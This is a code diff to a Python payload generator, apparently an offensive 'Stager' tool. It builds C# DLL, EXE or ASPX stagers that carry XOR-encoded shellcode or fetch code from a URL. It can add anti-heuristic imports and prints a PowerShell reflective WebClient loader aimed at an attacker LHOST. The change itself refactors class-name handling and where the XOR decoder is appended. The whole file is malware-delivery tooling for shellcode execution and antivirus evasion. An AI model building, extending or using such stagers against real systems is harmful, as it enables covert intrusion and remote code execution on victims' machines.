@@ -56,6 +56,7 @@ class Stager:
       self.compiled_fn = self.args.output + ".dll"
       self.cs_entrypoint = CS_ENTRY_DLL
       self.cs_namespace = CS_NAMESPACE
+      self.cs_classname = CS_CLASSNAME
       self.compile_flags = f"/target:library -out:{self.compiled_fn}"
     elif args.format == "exe":
       self.compiled = True
@@ -63,6 +64,7 @@ class Stager:
       self.compiled_fn = self.args.output + ".exe"
       self.cs_entrypoint = "Main"
       self.cs_namespace = CS_NAMESPACE
+      self.cs_classname = CS_CLASSNAME
       self.compile_flags = f"-out:{self.compiled_fn}"
     elif args.format == "aspx":
       self.compiled = False
@@ -93,10 +95,15 @@ class Stager:
 
     # Add staged or stageless code
     if self.args.stageless and self.shellcode is not None:
-      main_code = ak.SC_XOR_DECODER.format(xor_shellcode=self.shellcode.get_hex_csharp(),
-                                          xor_key=self.shellcode.get_key_csharp())
+      # Stageless
+      main_code = ak.SC_HARDCODED.format(xor_shellcode=self.shellcode.get_hex_csharp())
     else:
+      # Staged
       main_code = f"""{url_dl_code}"""
+
+    # Append XOR decoder
+    # TODO: Allow changing encryption types
+    main_code += ak.SC_XOR_DECODER.format(xor_key=self.shellcode.get_key_csharp())
 
     if self.args.heuristics:
       imports += f"{ak.HEURISTICS_IMPORT}"
@@ -152,8 +159,9 @@ class Stager:
   def print_ps_loader(self):
     t = ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST,
                                           tool=self.compiled_fn,
-                                          tool_class=self.cs_namespace,
                                           entrypoint=self.cs_entrypoint,
+                                          tool_namespace=self.cs_namespace,
+                                          tool_classname=self.cs_classname,
                                           cmd="")
 
     if self.args.format == 'dll':
